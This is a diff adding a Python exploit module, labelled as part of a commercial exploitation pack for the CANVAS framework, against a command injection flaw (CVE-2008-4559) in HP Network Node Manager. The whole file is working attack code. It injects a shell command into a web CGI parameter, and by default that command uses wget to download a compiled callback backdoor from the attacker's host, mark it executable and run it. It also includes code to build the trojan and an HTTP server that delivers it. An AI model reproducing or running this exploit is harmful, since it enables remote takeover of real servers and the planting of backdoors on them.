@@ -1,0 +1,282 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys
+import random
+import time
+import thread
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.spkproxy import header, body
+from libs.canvasos import *
+from httplib import HTTPConnection
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "HP Network Node Manager Command Injection Vulnerability"
+DESCRIPTION = "Remote command vulnerability in HP Network Node Manager"
+VERSION = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "HP"
+DOCUMENTATION["Date public"] = "2009.06.02"
+DOCUMENTATION["VersionsAffected"] = "HP Network Node Manager version 7.53"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=770"
+DOCUMENTATION["CVE Name"] = "CVE-2008-4559"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4559"
+DOCUMENTATION["Notes"] = ""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+class theexploit(tcpexploit):
+    def __init__(self):
+			tcpexploit.__init__(self)
+			self.TROJANMODE = 0
+			self.setInfo(DESCRIPTION)
+			self.name = NAME       
+			self.port = 3443
+			self.trojanname = "linmosdef"
+			self.cmd = ""
+			return
+
+    def maketrojan(self):    	
+      t_os = canvasos("Linux")
+      t_os.arch = "X86"
+        
+      from MOSDEF import makeexe
+      from MOSDEF.cc import threadsafe_cc_main
+
+      self.log("[D2] Compiling Unix trojan")
+      infilename = "backdoors/cback_mmap_rwx.c"
+      vars = {}
+      vars['CBACK_PORT'] = self.callback.port
+      vars['CBACK_ADDR'] = str2int32(socket.inet_aton(self.callback.ip))
+      self.log("[D2] Callback address is %s"%vars['CBACK_ADDR'])
+      cc_command = []
+    		
+      for var in vars:
+         cc_command += ["-D","%s=%s"%(var,vars[var])]
+    			
+      cc_command += ["-d", "-v","-m","Linux" ,"-p", "i386","-k", "None", infilename]
+      self.log("[D2] CC command: %s"%cc_command)
+      mosdeftrojan = threadsafe_cc_main(cc_command)
+    		
+      if not mosdeftrojan:
+        self.log("[D2] Was unable to create trojan!")    	
+        return ""
+
+      self.log("[D2] Length of CC compiled trojan: %s"% len(mosdeftrojan))
+      self.log("[D2] Writing out %d bytes to %s"%(len(mosdeftrojan), self.trojanname))        
+      file(self.trojanname, "wb").write(mosdeftrojan)    	
+      ret = len(mosdeftrojan) != 0
+
+      return ret
+
+    def makesploit(self, clientheader, clientbody):        
+			from libs.spkproxy import header, body
+			h = header('SERVER')
+			b = body()
+        
+			self.maketrojan()
+                
+			if clientheader.URL.count(self.trojanname):
+				self.log("[D2] Sending MOSDEF trojan")
+				f = open(self.trojanname, "rb")
+				sploitstring = f.read()
+				f.close()
+				os.remove(self.trojanname)
+				self.log("[D2] Sending %d bytes"%len(sploitstring))
+				h.addHeader("Content-type","binary/octet-stream")
+				h.addHeader("Connection","close")
+				b.setBody(sploitstring)
+
+			return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import LINUXMOSDEF
+        return [LINUXMOSDEF]
+
+    #################################################################################################################
+    # Code from httpserver.py
+    def listen(self):
+        self.getargs()
+        s=self.gettcplistener(80, "0.0.0.0")
+
+        if not s:
+            if self.port < 1024:
+                self.log("[D2] Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
+                         "you can try to bind to a higher port" % self.port)
+            else:
+                self.log("[D2] Cannot listen on port %d - perhaps that port is already bound?" % self.port)
+            return 0
+        s.set_timeout(5)
+        self.s=s
+        return s 
+
+    def accept(self, s=None ):
+        """
+        Try to accept one connection
+        returns true if we found one
+        """
+        #we loop on this ,so no annoying printouts here
+        #self.log("Accepting connection")
+        if s==None:
+            s=self.s 
+        try:
+            infd,addr=s.accept()
+        except timeoutsocket.Timeout:
+            #self.log("Timed out - no accept yet")
+            return 
+        if infd==-1:
+            return
+
+        #else we have an infd
+        self.handle(infd)
+        return True #handled connection
+        
+    def handle(self, infd): 
+        self.log("[D2] Handling connection")
+        clientheader = header(state = "SERVER")
+        clientheader.ssl = self.ssl
+        ret = clientheader.readdata(infd)
+        clientbody = body()
+        
+        if clientheader.gotGoodHeader():
+            if clientheader.bodySize()>0 or clientheader.wasChunked:
+                self.log("[D2] Reading body")
+                clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+                self.log("[D2] Read body")
+
+        self.log("[D2] Creating exploit response")
+
+        servheader,servbody = self.makesploit(clientheader,clientbody)
+        
+        self.log("[D2] Responding")
+        
+        bodydata="".join(servbody.data)
+                    
+        #now we respond...
+        response = ""
+        response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+	
+        for akey in servheader.headerValuesDict.keys():
+            if akey not in [ "Content-Length", "Content-length"]:
+                response += servheader.grabHeader(akey)
+        self.log("[D2] Sending header data of %d bytes"%len(response))
+        chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
+        if not chunked:
+            response+="Content-Length: "+str(len(bodydata))+"\r\n"
+        response+="\r\n"
+        response+="".join(bodydata)
+        self.log("[D2] Total response length is %d bytes"%len(response))
+        try:
+            infd.sendall(response)
+        except socket.error:
+            self.log("[D2] Connection closed by peer")
+        self.log("[D2] Response sent")
+        infd.close() #connection close - later on we'll keep it.
+        return 
+    #
+    #################################################################################################################
+        
+        
+    def startHTTPServer(self):
+    	s = self.listen()
+        
+    	if not s:
+    		self.log("[D2 LOG] Failed to listen - not running")
+    		return 0
+    		
+    	while 1:
+    		if self.state==self.HALT:
+    			self.s.close()
+    			break
+    			
+    		self.accept()
+
+    	self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
+        
+    	return 1    	
+    
+        
+    def run(self):
+			self.host = self.target.interface
+			self.port = int(self.argsDict.get("port", self.port))
+
+			if (self.argsDict.get("cmd", self.cmd) == ""):
+				self.TROJANMODE = 1
+    		
+				self.cmd = "wget -O /tmp/" + self.trojanname + " http://" + self.callback.ip + "/" + self.trojanname + "; chmod %2bx /tmp/" + self.trojanname + "; /tmp/" + self.trojanname
+    			
+				thread.start_new_thread(self.startHTTPServer,())
+    		
+			else:
+				self.cmd = self.argsDict.get("cmd", self.cmd)
+
+			self.setInfo("%s attacking %s:%d - running" % (NAME, self.host, self.port))
+			self.log("[D2] Attacking %s:%d" % (self.host, self.port))
+
+			self.cmd = self.cmd.replace(' ', '%20')
+
+			sploitstring = "/OvCgi/webappmon.exe?ins=nowait&act=natping&sel=\"255.255.255.255;%s;" % self.cmd
+			mainurl = "http://%s:%d/%s" % (self.host, self.port, sploitstring)
+			headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)'}
+
+			try:
+				self.cnx = HTTPConnection(self.host, self.port)
+			except:
+				self.log("[D2] Failed to connect to %s:%d" % (self.host, self.port))
+				self.setInfo('[D2] %s attacking %s:%d - done (failed)' % (NAME,self.host,self.port))
+				return 0
+
+			try:
+				self.cnx.request("GET", mainurl, None, headers)
+			except:
+				self.log("[D2] Can't send request %s" % mainurl)
+				self.setInfo('[D2] %s attacking %s:%d - done (failed)' % (NAME,self.host,self.port))
+				return 0
+
+			if (self.TROJANMODE == 1):
+				while 1:
+					time.sleep(1)
+			else:
+				try:
+					resp = self.cnx.getresponse()
+				except:
+					self.log("[D2] Can't get response with request %s" % url)
+					self.setInfo('[D2] %s attacking %s:%d - done (failed)' % (NAME,self.host,self.port))
+					return 0 
+				
+				self.log("[D2] %s" % resp.read())
+                
+			self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+			return 1
+    	
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
